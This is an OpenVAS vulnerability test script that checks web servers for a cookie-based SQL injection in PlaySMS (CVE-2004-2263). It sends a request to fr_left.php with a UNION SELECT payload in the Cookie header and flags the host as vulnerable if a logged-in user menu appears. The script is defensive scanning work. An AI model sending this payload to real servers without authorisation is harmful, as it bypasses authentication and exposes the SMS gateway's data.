###############################################################################
# OpenVAS Vulnerability Test
# $Id: playsms_sql_inject.nasl 6056 2017-05-02 09:02:50Z teissa $
#
# PlaySMS Cookie SQL Injection
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Contact: Noam Rathaus <noamr@beyondsecurity.com>
# Subject: PlaySMS SQL Injection via Cookie
# Date:     18.8.2004 15:03

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14362");
  script_version("$Revision: 6056 $");
  script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-2263");
  script_bugtraq_id(10751, 10752, 10970);
  script_xref(name:"OSVDB", value:"8984");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("PlaySMS Cookie SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to version 0.7.1 or later.");
  script_tag(name:"summary", value:"PlaySMS is a full-featured SMS gateway application that features sending of
  single or broadcast SMSes, the ability to receive and forward SMSes, an SMS board, an SMS polling system, SMS customs
  for handling incoming SMSes and forwarding them to custom applications, and SMS commands for saving/retrieving
  information to/from a server and executing server-side shell scripts.");
  script_tag(name:"impact", value:"An SQL Injection vulnerability in the product allows remote attackers to
  inject arbitrary SQL statements via the cookie mechanism used by the product.");

  script_xref(name:"URL", value:"http://sourceforge.net/project/shownotes.php?release_id=254915");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

if( ! can_host_php( port:port ) ) exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/fr_left.php";

  req = string( "GET ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n",
                "Accept-Language: en-us,en;q=0.5\r\n",
                "Cookie: vc1=ticket; vc2='%20union%20select%20'ticket;\r\n",
                "Connection: close\r\n\r\n" );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( "User's Menu" >< res && "Add SMS board" >< res ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
